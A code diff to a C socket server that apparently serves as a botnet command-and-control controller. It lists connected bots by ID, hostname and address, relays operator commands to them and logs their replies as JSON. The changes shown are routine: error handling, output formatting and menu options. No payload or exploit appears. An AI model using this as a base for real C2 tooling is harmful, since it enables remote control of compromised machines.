@@ -1,10 +1,11 @@
 // Listens for connection and sends message to connected client
-// to compile: gcc server.c -o server -lpthread
+// to compile: gcc server.c -o server -lpthread -ljson-c
+// json-c can be installed using the package libjson-c-dev (debian) or json-c-devel (red hat)
 
 /*
-Code is void of input sanitation and missing a lot of error checks.
-Code does not update array when client disconnects.
-Code has no functionality to exit cleanly.exir
+TODO:
+    Full input sanitisation.
+    Cleanly exit
 */
 
 #include "simple_networking.h"
@@ -36,6 +37,7 @@ void output_to_json(json_object *jsonObject);
 // Global Graceful Exit Flag
 int exitflag = 0;
 
+// pthread global variables
 static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 
 int main(void)
@@ -74,8 +76,6 @@ void *handle_connection(void *arg)
     int new_fd;
     int fd_count = 1;
 
-    printf("[+] Looking for connections\n");
-
     while (1)
     {
 
@@ -89,8 +89,8 @@ void *handle_connection(void *arg)
             // Check return code of poll(). Return error if -1
             if (rc == -1)
             {
-                perror("[-] Error poll()");
-                exit(1);
+                perror("[-] Error poll()\n");
+                continue;
             }
 
             // Check if socket is ready to read
@@ -107,7 +107,8 @@ void *handle_connection(void *arg)
                     // Check return code of accept(). Return error if -1
                     if (new_fd == -1)
                     {
-                        perror("[-] Error accept()");
+                        perror("[-] Error accept()\n");
+                        continue;
                     }
                     else
                     {
@@ -142,6 +143,8 @@ void *handle_connection(void *arg)
                         {
                             // Oops, our recv call failed.
                             printf("[-] Unable to recieve hostname from new client.\n");
+                            pthread_mutex_unlock(&mutex);
+                            continue;
                         }
 
                         // Overwrite the newline char with a null terminator
@@ -149,8 +152,7 @@ void *handle_connection(void *arg)
 
                         new_con->hostname = malloc(bytes_recv);
                         sprintf(new_con->hostname, "%s", recieved_data);
-                        printf("New Connection from %s - %s - %d\n", new_con->hostname, new_con->dest_ip, new_con->dest_port);
-
+                        
                         // Release lock
                         pthread_mutex_unlock(&mutex);
                     }
@@ -160,6 +162,7 @@ void *handle_connection(void *arg)
             fd_count = count_connections(head);
         }
     }
+    return;
 }
 
 void *bot_command(void *arg)
@@ -207,7 +210,7 @@ void *bot_command(void *arg)
             // Iterate through array and print client information
             while (tmp != NULL)
             {
-                printf("Client %d - %s - is on fd %d\n", i, tmp->hostname, tmp->sock_fd);
+                printf("[ID %d] [%s] [%s:%d]\n", i, tmp->hostname, tmp->dest_ip, tmp->dest_port);
                 tmp = tmp->next;
                 i++;
             }
@@ -254,7 +257,7 @@ void *bot_command(void *arg)
                     // Iterate through array and print client information
                     while (tmp != NULL)
                     {
-                        printf("Client %d - %s - is on fd %d\n", i, tmp->hostname, tmp->sock_fd);
+                        printf("[ID: %d] [%s] [%s:%d]\n", i, tmp->hostname, tmp->dest_ip, tmp->dest_port);
                         tmp = tmp->next;
                         i++;
                     }
@@ -311,7 +314,7 @@ void *bot_command(void *arg)
                             printf("%s", tmp->dest_ip);
                             json_object *timmy = build_json_object(tmp, recieved_data, data);
                             output_to_json(timmy);
-                            printf("%s said: %s\n", tmp->hostname, recieved_data);
+                            printf("[+] %s said: %s\n", tmp->hostname, recieved_data);
 
                             tmp = tmp->next;
                         }
@@ -326,6 +329,10 @@ void *bot_command(void *arg)
                     fgets(data, sizeof(data), stdin);
                     data[strcspn(data, "\n")] = 0;
                     int num = atoi(data);
+                    if (strcmp(data, "back") == 0)
+                    {
+                        break;
+                    }
 
                     // Sanitise user input
                     if (num < 1 || num > (count_connections(head) - 1))
@@ -443,19 +450,16 @@ void *bot_command(void *arg)
         {
             while (1)
             {
-                printf("Are You Sure? yes/no\n");
+                printf("Are you sure? y/N: ");
                 fgets(data, sizeof(data), stdin);
                 data[strcspn(data, "\n")] = 0;
-
-                if (strcmp(data, "yes") == 0)
+                // Default to no
+                if (data[0] == 'y' || data[0] == 'Y')
                 {
-                    printf("\nExiting...  \n");
                     exit(0);
                 }
-                else if (strcmp(data, "no") == 0)
-                {
-                    break;
-                }
+                break;
+
             }
         }
     }
